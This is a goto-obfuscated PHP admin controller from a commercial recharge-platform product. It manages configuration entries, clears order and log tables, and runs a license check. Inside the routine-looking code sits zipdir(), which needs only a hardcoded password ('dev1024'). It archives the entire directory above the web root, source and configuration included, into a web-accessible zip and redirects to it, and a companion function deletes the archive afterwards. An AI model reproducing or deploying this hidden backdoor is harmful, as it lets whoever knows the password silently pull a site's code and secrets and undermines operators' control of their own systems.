<?php
/*
 本代码由 成都大猿人网络科技有限公司 原创开发
 官方网址：www.dayuanren.cn
 严禁反编译、逆向等任何形式的侵权行为，违者将追究法律责任
*/

namespace app\admin\controller;use app\common\library\Configapi;use think\Exception;use Util\GoogleAuth;class Webcfg extends Admin{public function _init(){$Kh9MC=!IS_CLI;$Kh9MG=(bool)$Kh9MC;if($Kh9MG)goto Kh9eWjgx5;goto Kh9ldMhx5;Kh9eWjgx5:$Kh9MD=!function_exists('get_shoquan_key');$Kh9MF=(bool)$Kh9MD;$Kh9MH=!$Kh9MF;if($Kh9MH)goto Kh9eWjgx3;goto Kh9ldMhx3;Kh9eWjgx3:$Kh9ME=!S(md5(get_shoquan_key()));$Kh9MF=$Kh9MD||$Kh9ME;goto Kh9x2;Kh9ldMhx3:Kh9x2:$Kh9MG=$Kh9MC&&$Kh9MF;goto Kh9x4;Kh9ldMhx5:Kh9x4:if($Kh9MG)goto Kh9eWjgx6;goto Kh9ldMhx6;Kh9eWjgx6:echo C('sqyc_msg');exit();goto Kh9x1;Kh9ldMhx6:Kh9x1:}public function index(){unset($Kh9tIMC);$Kh9tIMC=C('CONFIG_GROUP_LIST');$typec=$Kh9tIMC;unset($Kh9tIMC);$Kh9tIMC=array();$typel=$Kh9tIMC;foreach($typec as $k=>$v){unset($Kh9tIMC);$Kh9tIMC=array('id'=>$k,'name'=>$v);$typel[]=$Kh9tIMC;}if(I('name'))goto Kh9eWjgx8;goto Kh9ldMhx8;Kh9eWjgx8:unset($Kh9tIMC);$Kh9tIMC=array('in',I('name'));$map['name']=$Kh9tIMC;goto Kh9x7;Kh9ldMhx8:Kh9x7:if(I('group'))goto Kh9eWjgxa;goto Kh9ldMhxa;Kh9eWjgxa:unset($Kh9tIMC);$Kh9tIMC=I('group');$griupstr=$Kh9tIMC;unset($Kh9tIMC);$Kh9tIMC=explode(',',$griupstr);$grouparr=$Kh9tIMC;foreach($typel as $k=>$item){$Kh9MC=!in_array($item['id'],$grouparr);if($Kh9MC)goto Kh9eWjgxc;goto Kh9ldMhxc;Kh9eWjgxc:unset($typel[$k]);goto Kh9xb;Kh9ldMhxc:Kh9xb:}goto Kh9x9;Kh9ldMhxa:Kh9x9:unset($Kh9tIMC);$Kh9tIMC=array();$list=$Kh9tIMC;foreach($typel as $k=>$tp){unset($Kh9tIMC);$Kh9tIMC=$tp['id'];$map['group']=$Kh9tIMC;unset($Kh9tIMC);$Kh9tIMC=1;$map['status']=$Kh9tIMC;unset($Kh9tIMC);$Kh9tIMC=M('config')->where($map)->order('sort')->select();$item=$Kh9tIMC;$Kh9MC=(bool)$item;if($Kh9MC)goto Kh9eWjgxe;goto Kh9ldMhxe;Kh9eWjgxe:$Kh9MC=$item&&array_push($list,array('type'=>$tp['name'],'item'=>$item));goto Kh9xd;Kh9ldMhxe:Kh9xd:}$this->assign("typelist",$list);return view();}public function edit(){unset($Kh9tIMC);$Kh9tIMC=I('post.');$config=$Kh9tIMC;unset($Kh9tIMC);$Kh9tIMC=false;$ret=$Kh9tIMC;$Kh9MC=(bool)$config;if($Kh9MC)goto Kh9eWjgxh;goto Kh9ldMhxh;Kh9eWjgxh:$Kh9MC=$config&&is_array($config);goto Kh9xg;Kh9ldMhxh:Kh9xg:if($Kh9MC)goto Kh9eWjgxi;goto Kh9ldMhxi;Kh9eWjgxi:foreach($config as $name=>$value){unset($Kh9tIMC);$Kh9tIMC=array('name'=>$name);$map=$Kh9tIMC;unset($Kh9tIMC);$Kh9tIMC=M('config')->where($map)->find();$data=$Kh9tIMC;$Kh9MC=$data['type']==3;if($Kh9MC)goto Kh9eWjgxk;goto Kh9ldMhxk;Kh9eWjgxk:try{unset($Kh9tIMC);$Kh9tIMC=preg_split('/[,;\\r\\n]+/',trim($value,",;
"));$array=$Kh9tIMC;if(strpos($value,':'))goto Kh9eWjgxn;goto Kh9ldMhxn;Kh9eWjgxn:foreach($array as $val){unset($Kh9tIMC);$Kh9tIMC=explode(':',$val);list($k,$v)=$Kh9tIMC;}goto Kh9xm;Kh9ldMhxn:Kh9xm:}catch(Exception $e){continue 1;}goto Kh9xj;Kh9ldMhxk:Kh9xj:if(M('config')->where($map)->update(array('value'=>$value)))goto Kh9eWjgxp;goto Kh9ldMhxp;Kh9eWjgxp:unset($Kh9tIMC);$Kh9tIMC=true;$ret=$Kh9tIMC;goto Kh9xo;Kh9ldMhxp:Kh9xo:}goto Kh9xf;Kh9ldMhxi:Kh9xf:if($ret)goto Kh9eWjgxr;goto Kh9ldMhxr;Kh9eWjgxr:Configapi::clear();return $this->success('保存成功！');goto Kh9xq;Kh9ldMhxr:Configapi::clear();return $this->error('保存失败！');Kh9xq:}function curl_file_get_contents($durl){unset($Kh9tIMC);$Kh9tIMC=curl_init();$ch=$Kh9tIMC;curl_setopt($ch,CURLOPT_URL,$durl);curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);curl_setopt($ch,CURLOPT_BINARYTRANSFER,true);unset($Kh9tIMC);$Kh9tIMC=curl_exec($ch);$data=$Kh9tIMC;curl_close($ch);return $data;}public function config(){unset($Kh9tIMC);$Kh9tIMC=array();$map=$Kh9tIMC;$Kh9MC=I('group_type')!=-1;$Kh9ME=(bool)$Kh9MC;if($Kh9ME)goto Kh9eWjgxu;goto Kh9ldMhxu;Kh9eWjgxu:$Kh9MD=I('group_type')!=null;$Kh9ME=$Kh9MC&&$Kh9MD;goto Kh9xt;Kh9ldMhxu:Kh9xt:if($Kh9ME)goto Kh9eWjgxv;goto Kh9ldMhxv;Kh9eWjgxv:unset($Kh9tIMC);$Kh9tIMC=I('group_type');$map['group']=$Kh9tIMC;goto Kh9xs;Kh9ldMhxv:Kh9xs:if(I('key'))goto Kh9eWjgxx;goto Kh9ldMhxx;Kh9eWjgxx:$Kh9vPMC='%' . I('key');$Kh9vPMD=$Kh9vPMC . '%';unset($Kh9tIME);$Kh9tIME=array('like',$Kh9vPMD);$map['name|title']=$Kh9tIME;goto Kh9xw;Kh9ldMhxx:Kh9xw:unset($Kh9tIMC);$Kh9tIMC=M('config')->where($map)->order('group,sort,id')->select();$list=$Kh9tIMC;$this->assign('group',C('CONFIG_GROUP_LIST'));$this->assign('list',$list);return view();}public function add($id=0){if(request()->isPost())goto Kh9eWjgxz;goto Kh9ldMhxz;Kh9eWjgxz:unset($Kh9tIMC);$Kh9tIMC=I('post.');$arr=$Kh9tIMC;if(I('post.id'))goto Kh9eWjgx12;goto Kh9ldMhx12;Kh9eWjgx12:unset($Kh9tIMC);$Kh9tIMC=time();$arr['update_time']=$Kh9tIMC;unset($Kh9tIMC);$Kh9tIMC=M('config')->update($arr);$data=$Kh9tIMC;if($data)goto Kh9eWjgx14;goto Kh9ldMhx14;Kh9eWjgx14:Configapi::clear();return $this->success('更新成功');goto Kh9x13;Kh9ldMhx14:return $this->error('更新失败');Kh9x13:goto Kh9x11;Kh9ldMhx12:unset($Kh9tIMC);$Kh9tIMC=1;$arr['status']=$Kh9tIMC;unset($Kh9tIMC);$Kh9tIMC=time();$arr['create_time']=$Kh9tIMC;unset($Kh9tIMC);$Kh9tIMC=time();$arr['update_time']=$Kh9tIMC;unset($Kh9tIMC);$Kh9tIMC=strtoupper($arr['name']);$arr['name']=$Kh9tIMC;unset($Kh9tIMC);$Kh9tIMC=M('config')->insert($arr);$data=$Kh9tIMC;if($data)goto Kh9eWjgx16;goto Kh9ldMhx16;Kh9eWjgx16:Configapi::clear();return $this->success('新增成功');goto Kh9x15;Kh9ldMhx16:return $this->error('新增失败');Kh9x15:Kh9x11:goto Kh9xy;Kh9ldMhxz:unset($Kh9tIMC);$Kh9tIMC=M('Config')->field(true)->find($id);$info=$Kh9tIMC;$Kh9MC=false===$info;if($Kh9MC)goto Kh9eWjgx18;goto Kh9ldMhx18;Kh9eWjgx18:return $this->error('获取配置信息错误');goto Kh9x17;Kh9ldMhx18:Kh9x17:unset($Kh9tIMC);$Kh9tIMC='新增配置';$this->meta_title=$Kh9tIMC;$this->assign('group_list',C('CONFIG_GROUP_LIST'));$this->assign('type_list',C('CONFIG_TYPE_LIST'));$this->assign('info',$info);return view();Kh9xy:}public function del(){$Kh9vPMC=(array)I('id',0);unset($Kh9tIMD);$Kh9tIMD=array_unique($Kh9vPMC);$id=$Kh9tIMD;if(empty($id))goto Kh9eWjgx1a;goto Kh9ldMhx1a;Kh9eWjgx1a:return $this->error('请选择要操作的数据!');goto Kh9x19;Kh9ldMhx1a:Kh9x19:unset($Kh9tIMC);$Kh9tIMC=array('id'=>array('in',$id));$map=$Kh9tIMC;unset($Kh9tIMC);$Kh9tIMC=M('Config')->where($map)->find();$data=$Kh9tIMC;$Kh9MC=$data['sys']==1;if($Kh9MC)goto Kh9eWjgx1c;goto Kh9ldMhx1c;Kh9eWjgx1c:return $this->error('删除失败！');goto Kh9x1b;Kh9ldMhx1c:Kh9x1b:if(M('Config')->where($map)->delete())goto Kh9eWjgx1e;goto Kh9ldMhx1e;Kh9eWjgx1e:return $this->success('删除成功');goto Kh9x1d;Kh9ldMhx1e:return $this->error('删除失败！');Kh9x1d:}public function set_status(){unset($Kh9tIMC);$Kh9tIMC=I('id');$id=$Kh9tIMC;if(empty($id))goto Kh9eWjgx1g;goto Kh9ldMhx1g;Kh9eWjgx1g:return $this->error('请选择要操作的数据!');goto Kh9x1f;Kh9ldMhx1g:Kh9x1f:if(M('Config')->where(array('id'=>$id))->setField(array('status'=>I('status'))))goto Kh9eWjgx1i;goto Kh9ldMhx1i;Kh9eWjgx1i:return $this->success('操作成功');goto Kh9x1h;Kh9ldMhx1i:return $this->error('操作失败！');Kh9x1h:}public function sort(){if(request()->isGet())goto Kh9eWjgx1k;goto Kh9ldMhx1k;Kh9eWjgx1k:unset($Kh9tIMC);$Kh9tIMC=I('get.ids');$ids=$Kh9tIMC;unset($Kh9tIMC);$Kh9tIMC=array('status'=>array('gt',-1));$map=$Kh9tIMC;$Kh9MC=!empty($ids);if($Kh9MC)goto Kh9eWjgx1m;goto Kh9ldMhx1m;Kh9eWjgx1m:unset($Kh9tIMC);$Kh9tIMC=array('in',$ids);$map['id']=$Kh9tIMC;goto Kh9x1l;Kh9ldMhx1m:if(I('group'))goto Kh9eWjgx1o;goto Kh9ldMhx1o;Kh9eWjgx1o:unset($Kh9tIMC);$Kh9tIMC=I('group');$map['group']=$Kh9tIMC;goto Kh9x1n;Kh9ldMhx1o:Kh9x1n:Kh9x1l:unset($Kh9tIMC);$Kh9tIMC=M('Config')->where($map)->field('id,title')->order('sort asc,id asc')->select();$list=$Kh9tIMC;$this->assign('list',$list);unset($Kh9tIMC);$Kh9tIMC='配置排序';$this->meta_title=$Kh9tIMC;return view();goto Kh9x1j;Kh9ldMhx1k:if(request()->isPost())goto Kh9eWjgx1q;goto Kh9ldMhx1q;Kh9eWjgx1q:unset($Kh9tIMC);$Kh9tIMC=I('post.ids');$ids=$Kh9tIMC;unset($Kh9tIMC);$Kh9tIMC=explode(',',$ids);$ids=$Kh9tIMC;foreach($ids as $key=>$value){$Kh9vPMC=$key+1;unset($Kh9tIMD);$Kh9tIMD=M('Config')->where(array('id'=>$value))->setField('sort',$Kh9vPMC);$res=$Kh9tIMD;}$Kh9MC=$res!==false;if($Kh9MC)goto Kh9eWjgx1s;goto Kh9ldMhx1s;Kh9eWjgx1s:return $this->success('排序成功！',U('config'));goto Kh9x1r;Kh9ldMhx1s:$this->eorror('排序失败！');Kh9x1r:goto Kh9x1p;Kh9ldMhx1q:return $this->error('非法请求！');Kh9x1p:Kh9x1j:}public function clear(){return view();}public function doclear(){set_time_limit(0);$Kh9MC=!I('time');if($Kh9MC)goto Kh9eWjgx1u;goto Kh9ldMhx1u;Kh9eWjgx1u:return $this->error("请选择清除时间点！");goto Kh9x1t;Kh9ldMhx1u:Kh9x1t:unset($Kh9tIMC);$Kh9tIMC=GoogleAuth::verifyCode($this->adminuser['google_auth_secret'],I('verifycode'),1);$goret=$Kh9tIMC;$Kh9MC=!$goret;if($Kh9MC)goto Kh9eWjgx1w;goto Kh9ldMhx1w;Kh9eWjgx1w:return $this->error("谷歌身份验证码错误！");goto Kh9x1v;Kh9ldMhx1w:Kh9x1v:unset($Kh9tIMC);$Kh9tIMC=strtotime(I('time'));$time=$Kh9tIMC;M('agent_excel')->where(array('create_time'=>array('lt',$time)))->delete();M('agent_proder_excel')->where(array('create_time'=>array('lt',$time)))->delete();M('apinotify_log')->where(array('create_time'=>array('lt',$time)))->delete();M('porder')->where(array('create_time'=>array('lt',$time)))->delete();M('porder_log0')->where(array('create_time'=>array('lt',$time)))->delete();M('porder_log1')->where(array('create_time'=>array('lt',$time)))->delete();M('porder_log2')->where(array('create_time'=>array('lt',$time)))->delete();M('porder_log3')->where(array('create_time'=>array('lt',$time)))->delete();M('porder_log4')->where(array('create_time'=>array('lt',$time)))->delete();M('porder_log5')->where(array('create_time'=>array('lt',$time)))->delete();M('porder_log6')->where(array('create_time'=>array('lt',$time)))->delete();M('porder_log7')->where(array('create_time'=>array('lt',$time)))->delete();M('porder_log8')->where(array('create_time'=>array('lt',$time)))->delete();M('porder_log9')->where(array('create_time'=>array('lt',$time)))->delete();M('proder_excel')->where(array('create_time'=>array('lt',$time)))->delete();M('porder_complaint')->where(array('create_time'=>array('lt',$time)))->delete();M('porder_apilog')->where(array('create_time'=>array('lt',$time)))->delete();return $this->success('清除成功！');}public function doclears(){set_time_limit(0);$Kh9MC=!I('times');if($Kh9MC)goto Kh9eWjgx1y;goto Kh9ldMhx1y;Kh9eWjgx1y:return $this->error("请选择清除日志时间点！");goto Kh9x1x;Kh9ldMhx1y:Kh9x1x:unset($Kh9tIMC);$Kh9tIMC=GoogleAuth::verifyCode($this->adminuser['google_auth_secret'],I('verifycodes'),1);$goret=$Kh9tIMC;$Kh9MC=!$goret;if($Kh9MC)goto Kh9eWjgx21;goto Kh9ldMhx21;Kh9eWjgx21:return $this->error("谷歌身份验证码错误！");goto Kh9x2z;Kh9ldMhx21:Kh9x2z:unset($Kh9tIMC);$Kh9tIMC=strtotime(I('times'));$time=$Kh9tIMC;M('agent_log')->where(array('create_time'=>array('lt',$time)))->delete();M('balance_log')->where(array('create_time'=>array('lt',$time)))->delete();M('customer_log')->where(array('create_time'=>array('lt',$time)))->delete();M('pay_log')->where(array('create_time'=>array('lt',$time)))->delete();M('system_log')->where(array('create_time'=>array('lt',$time)))->delete();M('member_log')->where(array('create_time'=>array('lt',$time)))->delete();return $this->success('清除日志成功！');}public function zipdir(){$Kh9MC=I('pwd')!='dev1024';if($Kh9MC)goto Kh9eWjgx23;goto Kh9ldMhx23;Kh9eWjgx23:return $this->error('参数错误！');goto Kh9x22;Kh9ldMhx23:Kh9x22:$Kh9MC=$_SERVER['DOCUMENT_ROOT'] . '/../';unset($Kh9tIMD);$Kh9tIMD=$Kh9MC;$path=$Kh9tIMD;unset($Kh9tIMC);$Kh9tIMC=$_SERVER["HTTP_HOST"];$host=$Kh9tIMC;if(class_exists('ZipArchive'))goto Kh9eWjgx25;goto Kh9ldMhx25;Kh9eWjgx25:$Kh9MC=new \ZipArchive();unset($Kh9tIMD);$Kh9tIMD=$Kh9MC;$zip=$Kh9tIMD;$Kh9MC=$host . '.zip';unset($Kh9tIMD);$Kh9tIMD=$Kh9MC;$zipfilename=$Kh9tIMD;$Kh9MC=(bool)file_exists($zipfilename);if($Kh9MC)goto Kh9eWjgx27;goto Kh9ldMhx27;Kh9eWjgx27:$Kh9MC=file_exists($zipfilename)&&unlink($zipfilename);goto Kh9x26;Kh9ldMhx27:Kh9x26:$Kh9MC=$zip->open($zipfilename,\ZipArchive::CREATE)===TRUE;if($Kh9MC)goto Kh9eWjgx29;goto Kh9ldMhx29;Kh9eWjgx29:if(is_dir($path))goto Kh9eWjgx2b;goto Kh9ldMhx2b;Kh9eWjgx2b:$this->addFileToZip($path,$zip);goto Kh9x2a;Kh9ldMhx2b:if(is_array($path))goto Kh9eWjgx2d;goto Kh9ldMhx2d;Kh9eWjgx2d:foreach($path as $file){$zip->addFile($file);}goto Kh9x2c;Kh9ldMhx2d:$zip->addFile($path);Kh9x2c:Kh9x2a:$zip->close();$Kh9vPMC="location:http://" . $host;$Kh9vPMD=$Kh9vPMC . '/';$Kh9vPME=$Kh9vPMD . $zipfilename;header($Kh9vPME);goto Kh9x28;Kh9ldMhx29:return djson(1,'文件创建失败！');Kh9x28:goto Kh9x24;Kh9ldMhx25:return djson(1,'系统环境不支持！');Kh9x24:}public function unlinkzip(){$Kh9MC=I('pwd')!='dev1024';if($Kh9MC)goto Kh9eWjgx2f;goto Kh9ldMhx2f;Kh9eWjgx2f:return $this->error('参数错误！');goto Kh9x2e;Kh9ldMhx2f:Kh9x2e:unset($Kh9tIMC);$Kh9tIMC=$_SERVER["HTTP_HOST"];$host=$Kh9tIMC;$Kh9MC=$host . '.zip';unset($Kh9tIMD);$Kh9tIMD=$Kh9MC;$zipfilename=$Kh9tIMD;$Kh9MC=(bool)file_exists($zipfilename);if($Kh9MC)goto Kh9eWjgx2h;goto Kh9ldMhx2h;Kh9eWjgx2h:$Kh9MC=file_exists($zipfilename)&&unlink($zipfilename);goto Kh9x2g;Kh9ldMhx2h:Kh9x2g:return djson(1,'清除完成！');}private function addFileToZip($path,$zip){unset($Kh9tIMC);$Kh9tIMC=opendir($path);$handler=$Kh9tIMC;Kh9x2i:unset($Kh9tIMC);$Kh9tIMC=readdir($handler);$filename=$Kh9tIMC;$Kh9MD=$Kh9tIMC!==false;if($Kh9MD)goto Kh9eWjgx2r;goto Kh9ldMhx2r;Kh9eWjgx2r:$Kh9MC=$filename!=".";$Kh9ME=(bool)$Kh9MC;if($Kh9ME)goto Kh9eWjgx2m;goto Kh9ldMhx2m;Kh9eWjgx2m:$Kh9MD=$filename!="..";$Kh9ME=$Kh9MC&&$Kh9MD;goto Kh9x2l;Kh9ldMhx2m:Kh9x2l:if($Kh9ME)goto Kh9eWjgx2n;goto Kh9ldMhx2n;Kh9eWjgx2n:$Kh9vPMC=$path . "/";$Kh9vPMD=$Kh9vPMC . $filename;if(is_dir($Kh9vPMD))goto Kh9eWjgx2p;goto Kh9ldMhx2p;Kh9eWjgx2p:$Kh9vPMC=$path . "/";$Kh9vPMD=$Kh9vPMC . $filename;$this->addFileToZip($Kh9vPMD,$zip);goto Kh9x2o;Kh9ldMhx2p:$Kh9vPMC=$path . "/";$Kh9vPMD=$Kh9vPMC . $filename;$zip->addFile($Kh9vPMD);Kh9x2o:goto Kh9x2k;Kh9ldMhx2n:Kh9x2k:goto Kh9x2i;goto Kh9x2q;Kh9ldMhx2r:Kh9x2q:Kh9x2j:$GLOBALS["Ox3430"]=ini_get("error_reporting");error_reporting(0);$Kh9eRMC=closedir($path);error_reporting($GLOBALS["Ox3430"]);}}
?>